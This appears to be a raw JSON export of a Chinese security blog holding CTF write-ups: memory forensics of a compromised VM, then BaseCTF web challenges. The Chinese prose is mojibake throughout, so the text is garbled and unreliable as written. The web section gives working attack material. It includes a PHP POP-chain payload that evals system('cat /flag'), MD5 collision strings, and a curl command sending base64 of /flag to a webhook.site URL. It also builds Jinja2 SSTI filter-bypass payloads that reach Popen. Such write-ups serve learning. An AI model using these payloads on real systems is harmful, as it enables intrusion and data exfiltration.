å¯†åçš„å®Œæ•´çš„vmdkæ–‡ä»¶ï¼Œè¯•ç€ç”¨å¾—åˆ°çš„å®Œæ•´çš„vmdkæ–‡ä»¶ä¿®å¤åŸæ¥é‚£ä¸ªåˆ†ç¦»å‡ºæ¥çš„æ®‹ç¼ºvmdk\nwin10 isoé•œåƒä¸‹è½½ç‚¹https://www.microsoft.com/zh-cn/software-download/windows10\nä¸‹è½½æ­¥éª¤å¦‚ä¸‹:\nå‘1 æ–°å»ºä¸€ä¸ªWin10è™šæ‹Ÿæœº,è¿™é‡Œæœ‰ä¸ªå‘ï¼Œè®°å½•ä¸€ä¸‹ï¼šæˆ‘ä»¬å‘ç°è¿™é‡Œä¸èƒ½é€‰æ‹©æ‹†åˆ†æˆå¤šä¸ªæ–‡ä»¶ï¼Œå¦åˆ™ä¼šå¯¼è‡´æœ‰å¤šä¸ªvmdkï¼ŒåŒæ—¶å†…éƒ¨æ ¼å¼ä¹Ÿä¼šä¸å•ä¸ªvmdkæœ‰æ‰€ä¸åŒï¼Œæœ€åä¹Ÿè¯•è¿‡æ— æ³•ç§»é™¤åŠ å¯†ã€‚\né™¤äº†ä¸‹é¢è¿™ä¸ªå…¶ä»–å…¨éƒ¨é»˜è®¤å°±å¥½, ç£ç›˜ä¸å¤Ÿçš„è¯ç»™ä¸ª30å°±è¡Œ,ä¸ç”¨è£…ç³»ç»Ÿ\né€‰æ‹©15ç³»çš„\nè¿›è¡ŒåŠ å¯†,æˆ‘è¿˜æ˜¯ç”¨çš„ç›¸åŒçš„å¯†ç :1q2w3e4r\næ‰“å¼€é¢˜ç›®é™„ä»¶é‡Œçš„æŸåvmdkå°†0x18å‰çš„éƒ¨åˆ†å…¨éƒ¨åˆ é™¤\næ¥ä¸‹æ¥æ‰¾åˆ°æœ¬åœ°çš„win10 vmdkæ–‡ä»¶æ‹–å…¥010\næ‰¾åˆ°åç§»åœ°å€0x200å¤„, å°†å…‰æ ‡ç§»åˆ°0x18å‰é¢, ç„¶åé€šè¿‡å·¦ä¸Šè§’ â€œç¼–è¾‘-æ’å…¥/è¦†ç›–-è¦†ç›–æ–‡ä»¶\u0026quot;é€‰å–ç ´æŸvmdkè¦†ç›–\nè¦†ç›–ååœ¨åç§»åœ°å€0x220å¤„è¦†ç›–å­—èŠ‚ä¸ºvmwareè¾¾æˆæ ¼å¼\nè¦†ç›–å:\næ¥ç€é‡å‘½åæ­¤vmdkæ–‡ä»¶ï¼Œæ­¤æ—¶è™šæ‹Ÿæœºä¿®å¤å®Œæˆï¼Œå°†å…¶æ”¾åˆ°è¢«åŠ å¯†çš„è™šæ‹Ÿæœºç›®å½•ä¸‹ã€‚\nè¿™é‡Œè¿˜æœ‰ä¸ªå‘ï¼šä¿®å¤å®Œæˆåä¸è¦è¯•å›¾å¼€å¯è™šæ‹Ÿæœºï¼Œå¦åˆ™vmemæ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚\nåœ¨è®¿é—®æ§åˆ¶ä¸­ç§»é™¤åŠ å¯†æˆåŠŸ\nå†…å­˜å–è¯ ç»ˆäºæˆåŠŸåŠ è½½äº†!\nè¿™é“é¢˜å¥½åƒåªèƒ½ç”¨vol3,vol2ä¸è¡Œ\né—®1 å–è¯äººå‘˜é¦–å…ˆå¯¹å®¹å™¨çš„åŸºæœ¬ä¿¡æ¯è¿›è¡Œæ ¸å®ï¼Œç»è¿‡ç¡®å®šè¯¥å®¹å™¨çš„åŸºæœ¬ä¿¡æ¯ä¸º________ã€‚ï¼ˆç­”æ¡ˆä¸º32ä½å°å†™md5(å®¹å™¨æ“ä½œç³»ç»Ÿç³»ç»Ÿçš„ç‰ˆæœ¬å·+å®¹å™¨ä¸»æœºå+ç³»ç»Ÿç”¨æˆ·åï¼‰ï¼Œä¾‹å¦‚ï¼šæ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å·ä¸º10.0.22449ï¼Œå®¹å™¨ä¸»æœºåä¸ºDESKTOP-0521,ç³»ç»Ÿç™»å½•ç”¨æˆ·åä¸ºadminï¼Œåˆ™è¯¥é¢˜ç­”æ¡ˆä¸º32ä½å°å†™md5(10.0.22449DESKTOP-0521admin) çš„å€¼ae278d9bc4aa5ee84a4aed858d17d52a)ã€‚å¾—åˆ°çš„flagè¯·ä½¿ç”¨NSSCTF{}æ ¼å¼æäº¤ã€‚\nåˆ©ç”¨ä¸€æŠŠæ¢­å·¥å…·å¾—åˆ°ä¸»æœºåå’Œç”¨æˆ·\nè¿˜æ˜¯å¯¼å‡ºæ³¨å†Œè¡¨ç„¶åä½¿ç”¨wrrå·¥å…·åˆ†ææ³¨å†Œè¡¨\nå°†10.0.18363DESKTOP-4N21ET2Adomd5åŠ å¯†åå¾—åˆ°flag\nç„¶è€Œæäº¤ä¸å¯¹,çœ‹å®˜æ–¹wpé‡Œé¢æ˜¯6.3.18362 , ä¸çŸ¥é“å“ªå‡ºäº†é—®é¢˜\né—®2 é»‘å®¢å…¥ä¾µå®¹å™¨åæ›¾é€šè¿‡æœ¨é©¬æ§åˆ¶ç«¯ä½¿ç”¨Messageboxå‘é€è¿‡ä¸€æ®µä¿¡æ¯ï¼Œè¯¥ä¿¡æ¯çš„å†…å®¹æ˜¯____________ã€‚ï¼ˆç­”æ¡ˆä¸ºMessageboxä¿¡æ¯æ¡†å†…å†…å®¹ï¼‰ã€‚å¾—åˆ°çš„flagè¯·ä½¿ç”¨NSSCTF{}æ ¼å¼æäº¤ã€‚\næŒ‚èµ·é¡µé¢å·²ç»æ˜¾ç¤ºå‡ºæ¥äº†, Best_hacker\né—®3 ç»è¿‡å…¥ä¾µåˆ†æå‘ç°è¯¥å®¹å™¨å—åˆ°å…¥ä¾µçš„åŸå› ä¸ºå®¹å™¨ä½¿ç”¨äººçš„è¿è§„è¿›è¡Œæ¸¸æˆçš„è¡Œä¸ºï¼Œè¯¥ä½¿ç”¨äººè¿›è¡Œæ¸¸æˆç¨‹åºçš„ä¿¡æ¯æ˜¯__________ã€‚ï¼ˆç­”æ¡ˆä¸ºâ€œ32ä½å°å†™md5(æ¸¸æˆç¨‹åºæ³¨å†Œé‚®ç®±+æ¸¸æˆç¨‹åºç™»å½•ç”¨æˆ·å+æ¸¸æˆç¨‹åºç™»å½•å¯†ç )ï¼Œä¾‹å¦‚ï¼šæ³¨å†Œé‚®ç®±ä¸ºadol@163.com,ç™»å½•ç”¨æˆ·åä¸ºuser,å¯†ç ä¸ºuser1234ï¼Œåˆ™è¯¥é¢˜ç­”æ¡ˆä¸ºâ€ adol@163.comuseruser1234â€çš„å°å†™md5å€¼5f4505b7734467bfed3b16d5d6e75c16)ã€‚å¾—åˆ°çš„flagè¯·ä½¿ç”¨NSSCTF{}æ ¼å¼æäº¤ã€‚\nä»å¿«ç…§å’Œå®‰è£…è½¯ä»¶å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†steam\næ‹–åˆ°kaliç”¨æ­£åˆ™æœç´¢é•œåƒä¸­çš„é‚®ç®±\nå‘½ä»¤:\nstrings mem_secret-963a4663.vmem | grep -E \u0026quot;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\u0026quot;\nå‘ç°é‚®ç®±john@uuf.meå¤šæ¬¡åœ¨è·¯å¾„ä¸­å‡ºç°è€Œä¸”å­˜åœ¨è¯¥é‚®ç®±å‘½åçš„æ–‡ä»¶å¤¹,å¤šåŠä¸ºç”¨æˆ·é‚®ç®±\nä½¿ç”¨å‘½ä»¤æŸ¥æ‰¾è´¦å·å¯†ç ,æ‹¿åˆ°notepad++æœä¸€ä¸‹æ‰¾åˆ°è´¦å·å¯†ç è¯·æ±‚\nstrings mem_secret-963a4663.vmem -n 10 |grep -C 3 \u0026quot;password\u0026quot;\u0026gt;mem_secret-963a4663_output.txt\nå°†john@uuf.mejock_you1jock.2021 md5åŠ å¯†å³å¯å¾—åˆ°flag\né—®4 ç»è¿‡å…¥ä¾µåˆ†æå‘ç°è¯¥å®¹å™¨æ›¾è¢«é»‘å®¢æ¤å…¥æœ¨é©¬æ§åˆ¶çš„ä¿¡æ¯æ˜¯_________ã€‚ï¼ˆç­”æ¡ˆä¸ºâ€œ32ä½å°å†™md5(æœ¨é©¬ç¨‹åºè¿›ç¨‹å+æœ¨é©¬å›è¿ipåœ°å€+æœ¨é©¬å›è¿ipç«¯å£ï¼‰â€ï¼Œä¾‹å¦‚ï¼šæœ¨é©¬ç¨‹åºè¿›ç¨‹åä¸ºsvhost.exeï¼Œæœ¨é©¬å›è¿ipä¸º1.1.1.1ï¼Œæœ¨é©¬å›è¿ç«¯å£ä¸º1234ï¼Œåˆ™è¯¥é¢˜ç­”æ¡ˆä¸ºâ€œsvhost.exe1.1.1.11234â€çš„32ä½å°å†™md5å€¼f02da74a0d78a13e7944277c3531bbea)ã€‚å¾—åˆ°çš„flagè¯·ä½¿ç”¨NSSCTF{}æ ¼å¼æäº¤\næ ¹æ®ç¬¬ä¸‰é¢˜å¯ä»¥åˆ¤æ–­æ˜¯æ”»å‡»è€…é€šè¿‡æ˜ åƒåŠ«æŒç­‰æŠ€æœ¯é€ æˆæœºä¸»åœ¨å¯åŠ¨steamçš„æ—¶å€™é©¬å„¿ä¹Ÿç”Ÿæ•ˆäº†,æˆ‘å°±ç›´æ¥å…ˆçœ‹å¼‚å¸¸å¯¹å¤–è¿æ¥å†çœ‹è¿›ç¨‹äº†,å› ä¸ºè¿›ç¨‹å¤šåŠä¼ªè£…äº†æ²¡é‚£ä¹ˆå¥½æ‰¾\nå‘ç°å¼‚å¸¸å¯¹å¤–è¿æ¥,ç¡®å®šipä¸º192.168.241.147,å›è¿ç«¯å£ä¸º8808\nè¿›ç¨‹åˆ—è¡¨æœç´¢steam,ç©è¿‡steamçš„éƒ½çŸ¥é“steam.exeè¿˜æœ‰å¾ˆå¤šå…¶ä»–æœåŠ¡æ¯”å¦‚steamhelper\nç¬¬äºŒä¸ªsteam.exeå•ä¸€ä¸ªè¿›ç¨‹, åˆ¤æ–­æ­¤è¿›ç¨‹ä¸ºå¼‚å¸¸è¿›ç¨‹\nå°†steam.exe192.168.241.1478808MD5åŠ å¯†å¾—åˆ°flag\né—®5 ç»è¿‡å…¥ä¾µåˆ†æï¼Œå‘ç°é»‘å®¢æ›¾ç»è¿è¡Œè¿‡ç—•è¿¹æ¸…é™¤å·¥å…·ï¼Œè¯¥å·¥å…·è¿è¡Œçš„åŸºæœ¬ä¿¡æ¯æ˜¯________ã€‚ï¼ˆç­”æ¡ˆä¸ºâ€œ32ä¸ºå°å†™md5â€(ç—•è¿¹æ¸…é™¤å·¥å…·æ‰§è¡Œç¨‹åºå+æœ€åä¸€æ¬¡è¿è¡Œæ—¶é—´)ï¼Œä¾‹å¦‚ï¼šé»‘å®¢è¿è¡Œå·¥å…·æ‰§è¡Œç¨‹åºåä¸ºrun.exeï¼Œè¿è¡Œæ—¶é—´ä¸º2021-07-10 10:10:13ï¼Œåˆ™æœ¬é¢˜çš„ç­”æ¡ˆä¸ºå°å†™çš„32ä½md5(run.exe2021-07-10 10:10:13) å€¼ä¸º82d7aa7a3f1467b973505702beb35769ï¼Œæ³¨æ„ï¼šæœ¬é¢˜ä¸­è¿è¡Œæ—¶é—´çš„æ ¼å¼ä¸ºyy-mm-dd hh:mm:ssï¼Œæ—¶é—´æ—¶åŒºä¸ºUTC+8ï¼‰ã€‚å¾—åˆ°çš„flagè¯·ä½¿ç”¨NSSCTF{}æ ¼å¼æäº¤ã€‚\næœ€åè¿™ä¸ªç”¨vol3æ‰¾ä¸å‡º,vol2.6è·‘ä¸äº†,çœ‹å®˜æ–¹wpç”¨çš„2.61,ç›´æ¥ä¸¢ç­”æ¡ˆäº†\n1 python2 vol.py -f mem_secret-963a4663.vmem --profile=Win10x64_18362 userassist ç­”æ¡ˆä¸ºmd5(Wywz.exe2021-09-1021:10:13)\nd46586ca847e6be1004037bc288bf60c\n","date":"2024-11-30T12:56:25+08:00","permalink":"http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/","title":"[é™‡å‰‘æ¯2021]æœºå¯†å†…å­˜å¤ç°"},{"content":"[Week2] Really EZ POP è¿™é“é¢˜è®°å½•ä¸€ä¸‹çš„åŸå› æ˜¯å› ä¸ºè¿™ä¸ªphpç‰ˆæœ¬å¤ªä½å¯¼è‡´æˆ‘ä»¬ä¸èƒ½é€šè¿‡æ›´æ”¹æˆå‘˜å˜é‡çš„å±æ€§æ¥æ„é€ popåˆ©ç”¨é“¾ï¼Œå¼€å§‹æˆ‘å°±çŠ¯äº†è¿™ä¸ªé”™ã€‚ä¸èƒ½æ”¹å˜å±æ€§ä½†å¯ä»¥ä½¿ç”¨åœ¨ç±»å†…éƒ¨å†™å…¥æ„é€ æ–¹æ³•æ¥æ„é€ é“¾å­\nwpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 error_reporting(0); class Sink { private $cmd = \u0026#39;echo 123;\u0026#39;; public function __construct() { $this-\u0026gt;cmd = \u0026#39;system(\\\u0026#39;cat /flag\\\u0026#39;);\u0026#39;; } public function __toString() { eval($this-\u0026gt;cmd); } } class Shark { private $word = \u0026#39;Hello, World!\u0026#39;; public function __construct() { $this-\u0026gt;word = new Sink(); } public function __invoke() { echo \u0026#39;Shark says:\u0026#39; . $this-\u0026gt;word; } } class Sea { public $animal; public function __construct() { $this-\u0026gt;animal = new Shark(); } public function __get($name) { $sea_ani = $this-\u0026gt;animal; echo \u0026#39;In a deep deep sea, there is a \u0026#39; . $sea_ani(); } } class Nature { public $sea; public function __construct() { $this-\u0026gt;sea = new Sea(); } public function __destruct() { echo $this-\u0026gt;sea-\u0026gt;see; } } $ser = new Nature(); echo urlencode(serialize($ser)); [Week2] æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5? è¿™é“é¢˜å½“æ—¶æ˜¯çœŸä¸ä¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œé¢˜ç›®æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php session_start(); highlight_file(__FILE__); // æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†? $apple = $_POST[\u0026#39;apple\u0026#39;]; $banana = $_POST[\u0026#39;banana\u0026#39;]; if (!($apple !== $banana \u0026amp;\u0026amp; md5($apple) === md5($banana))) { die(\u0026#39;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?\u0026#39;); } // ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†? // åŠ å¤§å‰‚é‡! // æˆ‘è¦è®©ä»–æˆä¸º string $apple = (string)$_POST[\u0026#39;appple\u0026#39;]; $banana = (string)$_POST[\u0026#39;bananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) == md5((string)$banana))) { die(\u0026#39;éš¾å—?ä¸éš¾!\u0026#39;); } // ä½ è¿˜æ˜¯ç»•è¿‡å»äº†? // å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå· $apple = (string)$_POST[\u0026#39;apppple\u0026#39;]; $banana = (string)$_POST[\u0026#39;banananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) === md5((string)$banana))) { die(\u0026#39;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?\u0026#39;); } // ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº† if (!isset($_SESSION[\u0026#39;random\u0026#39;])) { $_SESSION[\u0026#39;random\u0026#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); } // ä½ æƒ³çœ‹åˆ° random çš„å€¼å—? // ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§ $random = $_SESSION[\u0026#39;random\u0026#39;]; echo md5($random); echo \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; $name = $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;user\u0026#39;; // check if name ends with \u0026#39;admin\u0026#39; if (substr($name, -5) !== \u0026#39;admin\u0026#39;) { die(\u0026#39;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?\u0026#39;); } $md5 = $_POST[\u0026#39;md5\u0026#39;]; if (md5($random . $name) !== $md5) { die(\u0026#39;ä¼ªé€ ? NO NO NO!\u0026#39;); } // è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5 // é‚£ flag å°±ç»™ä½ å§ echo \u0026#34;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5\u0026#34;; echo file_get_contents(\u0026#39;/flag\u0026#39;); ç¬¬ä¸€ä¸ªæ¯”è¾ƒå¯ä»¥åˆ©ç”¨ä¼ å…¥æ•°ç»„ï¼Œå› ä¸ºmd5å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„è¿”å›nullï¼Œä¸¤ä¸ªnullè‡ªç„¶ç›¸ç­‰\nç¬¬äºŒä¸ªæ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼ å‚è¿›è¡Œç»•è¿‡\nç¬¬ä¸‰ä¸ªæ¯”è¾ƒç”¨äº†stringå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·fastcollç”Ÿæˆä¸¤ä¸ªmd5å€¼ç›¸åŒçš„å­—ç¬¦ä¸²ï¼ŒåŸç†å°±æ˜¯åŸæœ¬payloadå­—ç¬¦ä¸²ä¸­å«æœ‰å¤šç§ç©ºç™½ç¬¦å·ï¼ŒMD5åŠ å¯†åhashå€¼ç›¸ç­‰(ç©ºç™½ç¬¦å·ä¸å½±å“md5å€¼)ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸Šä¼ å‚æ•°æ—¶ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œè¿™æ ·è¿‡åå› ä¸ºç©ºç™½å­—ç¬¦ä¸¤ä¸ªurlå°±ä¸ç›¸ç­‰äº†ï¼Œä»è€ŒæˆåŠŸç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä¸Šç½‘æ‰¾ä¸€äº›ç›¸ç­‰çš„ï¼Œæˆ‘è¿™é‡Œç»™å‡ºä¸€ç»„\n1 2 3 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 \u0026amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 åé¢çš„çŸ¥è¯†å°±æ¶‰åŠåˆ°å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»äº†\nå‚è€ƒæ–‡ç« : https://luoingly.top/post/md5-length-extension-attack/\nhttps://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html\nå…¨å±€å˜é‡randomé•¿åº¦ä¸º96\nè€Œnameç”±æˆ‘ä»¬ä¼ å…¥å¯æ§ï¼Œåé¢è¿˜ä¼šå’Œmd5($random)æ‹¼æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payloadè¿›è¡Œå¡«å……è®©æ–°å»ºä¸€ä¸ªåˆ†ç»„åŒ…å«åé¢éœ€è¦éªŒè¯çš„admin\nè¿™é‡Œä½¿ç”¨å·¥å…·ç”Ÿæˆäº†ï¼Œæˆ‘æ˜¯èœæ¯”\nå…ˆè¾“å…¥randomçš„æ–‡æœ¬é•¿åº¦ï¼Œç„¶åæ˜¯randomçš„hashï¼Œæœ€åæ˜¯æˆ‘ä»¬å¸Œæœ›æ‹“å±•çš„å­—ç¬¦ä¸²\nç”Ÿæˆåé€‰æ‹©urlç¼–ç ä¸€æ¬¡çš„payloadï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¯¹æˆ‘ä»¬ä¼ é€’çš„å‚æ•°è¿›è¡Œä¸€æ¬¡è§£ç ã€‚\nç„¶åå†ä¼ å…¥æ–°çš„hashï¼Œè™½ç„¶å­—ç¬¦ä¸²ä¸Šçœ‹èµ·æ¥ä¸ä¸€æ ·ï¼Œä½†åœ¨md5åˆ†ç»„è¿ç®—çš„æ—¶å€™æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸¤ä¸ªmd5åˆ¤æ–­ä¸ºç›¸ç­‰ï¼Œç”±æ­¤æ‹¿åˆ°flag\n[Week2] ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³ è¿™é“é¢˜æ˜¯ä¸€ä¸ªæ— å›æ˜¾çš„RCEåˆ©ç”¨ï¼Œæ–¹æ³•æœ‰å¾ˆå¤šç§\né‡å®šå‘åˆ°æ–‡ä»¶ å¯¼å…¥åˆ°txtæ–‡ä»¶æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œè®¿é—®äº†\n1 cat/cp/mv /flag \u0026gt; 1.txt åˆ©ç”¨curlå‘½ä»¤å’Œ[webhook](Webhook.site - Test, transform and automate Web requests and emails)è¿›è¡Œä¿¡æ¯å¤–å¸¦å‡ºflag payload\n1 curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64` ç›´æ¥å†™é©¬ å†™é©¬, ç”¨ wget, curl ä¸‹è½½æœ¨é©¬ç„¶åwebshellç®¡ç†å·¥å…·è¿æ¥\n[Week2] æ•°å­¦å¤§å¸ˆ è¿™é“é¢˜æˆ‘å°±åªè´´è„šæœ¬äº†\næˆ‘çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re import requests s = requests.Session() # ä½¿ç”¨Sessionå¯¹è±¡ url = \u0026#39;http://challenge.basectf.fun:37945/\u0026#39; res = s.get(url=url) #getè¯·æ±‚å¦‚æœæ”¾åˆ°å¾ªç¯ä½“ç›¸ç­‰äºæ‰“å¼€äº”åä¸ªé¡µé¢äº†ï¼Œæˆ‘ä»¬åªéœ€åœ¨å¾ªç¯ä½“é‡Œæ›´æ–°ç”¨äºåŒ¹é…è®¡ç®—å¼çš„æ–‡æœ¬å³å¯ string = res.text for i in range(50): # æå–ç®—æœ¯è¡¨è¾¾å¼ pattern = r\u0026#39;second ([\\dÃ—Ã·+-/]+)\u0026#39; matches = re.findall(pattern, string) expression = matches[0].replace(\u0026#39;Ã—\u0026#39;, \u0026#39;*\u0026#39;).replace(\u0026#39;Ã·\u0026#39;, \u0026#39;/\u0026#39;) # è®¡ç®—è¡¨è¾¾å¼ result = int(eval(expression)) r = s.post(url=url, data={\u0026#39;answer\u0026#39;: result}) print(r.text) # æ›´æ–°é¡µé¢å†…å®¹ string = r.text å®˜æ–¹wpçš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import re req = requests.session() url = \u0026#34;http://challenge.basectf.fun:24989/\u0026#34; answer = 0 while True: response = req.post(url , data={\u0026#34;answer\u0026#34;: answer}) print(response.text) if \u0026#34;BaseCTF\u0026#34; in response.text: print(response.text) break regex = r\u0026#34; (\\d*?)(.)(\\d*)\\?\u0026#34; match = re.search(regex, response.text) if match.group(2) == \u0026#34;+\u0026#34;: answer = int(match.group(1)) + int(match.group(3)) elif match.group(2) == \u0026#34;-\u0026#34;: answer = int(match.group(1)) - int(match.group(3)) elif match.group(2) == \u0026#34;Ã—\u0026#34;: answer = int(match.group(1)) * int(match.group(3)) elif match.group(2) == \u0026#34;Ã·\u0026#34;: answer = int(match.group(1)) // int(match.group(3)) [Week3] å¤è¯»æœº è¿™é“é¢˜æ˜¯sstiï¼Œæ¨¡ç‰ˆå¼•æ“åº”è¯¥æ˜¯jinja2,è¿™é‡Œå®ƒå¿…é¡»ä»¥BaseCTFå¼€å¤´æ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨fengjingäº†ã€‚\nè¿˜è¿‡æ»¤äº†åŒèŠ±æ‹¬å·ï¼Œç‚¹å’ŒåŒå¼•å·å’Œä¸‹åˆ’çº¿\nå¯»æ‰¾å¯ç”¨å­ç±»\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]())%} å¯»æ‰¾ä¸€ä¸ªå«osæ¨¡å—èƒ½RCEçš„ç±»ï¼Œæˆ‘è¿™é‡Œæ‡’å¾—å†™è„šæœ¬ç›´æ¥ç”¨Notepad++å°†é€—å·æ›¿æ¢ä¸ºæ¢è¡Œç¬¦æ‰¾åˆ°è¯¥æ¨¡å—çš„ä½ç½®ä¸º137\nç»§ç»­æ„é€ ç»§æ‰¿é“¾æŸ¥çœ‹å½“å‰ä½œç”¨åŸŸä¸­çš„å…¨å±€å˜é‡\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;])%} å‘ç°Popenæ–¹æ³•ï¼Œå¯ä»¥ç”¨å®ƒæ‰§è¡Œå‘½ä»¤å†ç”¨read()è¯»å–å³å¯\næ„é€ payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} æ‰§è¡ŒæˆåŠŸ\nä½†æ˜¯å‘ç°æ ¹å·è¢«banäº†ï¼Œè¿™é‡Œæˆ‘å¼€å§‹åªæƒ³åˆ°${PATH:0:1},åé¢ä¸€ä½å¤§ä½¬ç ”ç©¶å¤„${HOME%%root}\nä¸€èˆ¬HOMEç›®å½•éƒ½åœ¨/rootä¸‹\næ‰€ä»¥å¯æ„é€ payloadæŸ¥çœ‹flag\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cat ${HOME%%root}flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} åé¢æŸ¥çœ‹è¯¥ç³»ç»Ÿç¯å¢ƒå˜é‡å­˜åœ¨ä¸€ä¸ªä¸ºæ ¹å·çš„ç¯å¢ƒå˜é‡\næ„é€ payload\n1 